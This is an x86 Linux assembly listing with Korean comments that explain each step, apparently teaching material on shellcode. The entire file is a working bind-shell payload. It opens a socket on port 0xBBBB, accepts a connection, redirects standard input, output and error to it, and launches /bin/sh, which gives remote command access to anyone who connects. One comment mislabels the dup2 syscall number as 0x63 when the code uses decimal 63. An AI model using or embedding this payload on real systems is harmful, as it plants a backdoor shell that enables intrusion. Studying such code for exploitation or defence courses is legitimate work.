BITS 32
section .text
global _start
_start:
xor eax,eax	; eax 클리어
xor ebx,ebx	; ebx 클리어
xor edx,edx	; edx 클리어

;server=socket(2,1,0)
push	eax	; socket에 대한 세 번째 인수: 0
push	byte 0x1; socket에 대한 두 번째 인수: 1
push	byte 0x2; socket에 대한 첫 번째 인수: 2
mov	ecx,esp	; 배열의 주소를 socketcall의 두 번째 인수로 설정
inc	bl		; socketcall의 첫 번째 인수를 # 1로 지정
mov	al,102	; socketcall # 1 호출: SYS_SOCKET
int	0x80	; 커널 모드로 점프, syscall 호출
mov	esi,eax	; 반환값(eax)을 esi(server)에 저장

;bind(server,(struct sockaddr *)&serv_addr,0x10)
push	edx		; 아직 0임, 푸시된 다음 값 초기화
push	long 0xBBBB02BB	; 구조체 만들기:port,sin.family:02,& any 2bytes:BB
mov	ecx,esp		; 스택에 있는 addr 구조체를 ecx로 이동
push	byte  0x10	; 바인드 인수 시작, 16(크기)을 스택에 푸시
push	ecx		; 구조체의 주소를 스택에 저장
push	esi		; 서버 파일 기술자(지금은 esi에 있는)를 스택에 저장
mov	ecx,esp		; 배열의 주소를 socketcall에 대한 두 번째 인수로 설정
inc	bl			; bl을 # 2로 설정, socketcall의 첫 번째 인수
mov	al,102		; socketcall # 2 호출: SYS_BIND
int	0x80		; 커널 모드로 점프, syscall 호출

;listen(server, 0)
push	edx		; 아직 0임, 푸시된 다음 값 초기화에 사용
push	esi		; 서버 파일 기술자(esi)를 스택에 저장
mov	ecx,esp		; 배열의 주소를 socketcall에 대한 두 번째 인수로 설정
mov	bl,0x4		; 4를 bl로 이동, socketcall의 첫 번째 인수
mov	al,102		; socketcall #4 호출: SYS_LISTEN
int	0x80		; 커널 모드로 점프, syscall 호출

;client=accept(server, 0, 0)
push	edx	; 아직 0임, 세 번째 인수를 스택에 푸시
push	edx	; 아직 0임, 두 번째 인수를 스택에 푸시
push	esi	; 저장된 서버 파일 기술자를 스택에 푸시
mov	ecx,esp	; 인수를 ecx에 저장, socketcall에 대한 두 번째 인수가 됨
inc	bl		; bl을 5로 증가, socketcall의 첫 번째 인수
mov	al,102	; socketcall #5 호출: SYS_ACCEPT
int	0x80	; 커널 모드로 점프, syscall 호출

; dup2 명령 준비, ebx에 저장된 클라이언트 파일 핸들이 필요함
mov	ebx,eax	; 반환된 클라이언트 파일 기술자를 ebx로 복사

;dup2(client, 0)
xor	ecx,ecx	; ecx 초기화
mov	al,63	; syscall의 첫 번째 인수를 0x63로 설정: dup2
int	0x80	; 점프

;dup2(client, 1)
inc	ecx		; ecx를 1로 증가
mov	al,63	; dup2:63에 대한 syscall 준비
int	0x80	; 점프

;dup2(client, 2)
inc	ecx		; ecx를 2로 증가
mov	al,63	; dup2:63에 대한 syscall 준비
int	0x80	; 점프

;standard execve("/bin/sh"...
push edx
push long 0x68732f2f
push long 0x6e69622f
mov	ebx,esp
push	edx
push	ebx
mov	ecx,esp
mov	al, 0x0b
int 0x80
